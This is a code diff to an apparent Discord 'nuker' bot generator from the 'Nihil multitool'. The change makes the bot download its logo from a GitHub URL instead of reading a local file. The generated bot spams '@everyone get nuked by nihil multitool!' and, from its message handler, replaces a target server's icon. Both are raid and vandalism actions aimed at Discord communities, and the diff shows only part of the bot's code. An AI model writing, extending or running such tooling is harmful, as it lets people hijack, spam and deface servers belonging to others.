@@ -11,14 +11,16 @@ def start(token):
     """Start the bot in a separate process"""
     global bot_process, bot_token
     
-    # Get the path to nihil.jpg
-    nihil_jpg_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'nihil.jpg')
+    # URL for nihil.jpg from GitHub
+    NIHIL_JPG_URL = "https://raw.githubusercontent.com/igNovoline/Nihil/refs/heads/main/utils/nihil.jpg"
     
     # Create the bot script content
     bot_script = f'''
 import discord
 from discord.ext import commands
 import asyncio
+import urllib.request
+import io
 
 intents = discord.Intents.all()
 intents.typing = False
@@ -26,17 +28,26 @@ intents.presences = False
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Path to nihil.jpg
-NIHIL_JPG_PATH = r'{nihil_jpg_path.replace(chr(92), chr(92)+chr(92))}'
+# URL for nihil.jpg from GitHub
+NIHIL_JPG_URL = "{NIHIL_JPG_URL}"
 
 SPAM_MESSAGE = "@everyone get nuked by nihil multitool! https://github.com/igNovoline/Nihil"
+
+def get_nihil_jpg():
+    try:
+        with urllib.request.urlopen(NIHIL_JPG_URL) as response:
+            return response.read()
+    except Exception as e:
+        print(f"Could not download nihil.jpg: {{e}}")
+        return None
 
 @bot.event
 async def on_ready():
     # Set bot profile
     try:
-        with open(NIHIL_JPG_PATH, 'rb') as f:
-            await bot.user.edit(username="nihil bot", avatar=f.read())
+        avatar_data = get_nihil_jpg()
+        if avatar_data:
+            await bot.user.edit(username="nihil bot", avatar=avatar_data)
     except Exception as e:
         print(f"Could not set bot profile: {{e}}")
     
@@ -124,8 +135,9 @@ async def on_message(message):
             
             # Set server icon
             try:
-                with open(NIHIL_JPG_PATH, 'rb') as f:
-                    await guild.edit(icon=f.read())
+                icon_data = get_nihil_jpg()
+                if icon_data:
+                    await guild.edit(icon=icon_data)
             except Exception as e:
                 print(f"Could not set server icon: {{e}}")
             
